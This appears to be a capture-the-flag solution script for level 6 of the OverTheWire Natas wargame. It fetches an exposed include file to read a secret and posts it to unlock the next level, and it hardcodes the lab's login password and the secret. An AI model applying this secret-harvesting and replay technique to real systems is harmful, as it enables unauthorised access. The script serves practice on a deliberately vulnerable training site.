import requests
import config
import utils

"""
1. access the source code that is listed in the browser 
2. visit the link http://natas6.natas.labs.overthewire.org/includes/secret.inc
3. grab the secret and use it to login to level 7
"""

username = "natas6"
url = config.BASE_URL.format(username)
password = "fOIvE0MDtPTgRhqmmvvAOt2EfXR6uQgR"
auth = (username, password)
url_to_secret = url + "/includes/secret.inc"

# obtain the secret to submit to the endpoint
r_to_secret = requests.get(url_to_secret, auth=auth)
utils.save_file("secret.txt", r_to_secret.text)

data = {
    'secret': "FOEIUWGHFEEUHOFUOIU",
    'submit': 'Submit'
}

r = requests.post(url, data=data, auth=auth)
utils.save_file("output.txt", r.text)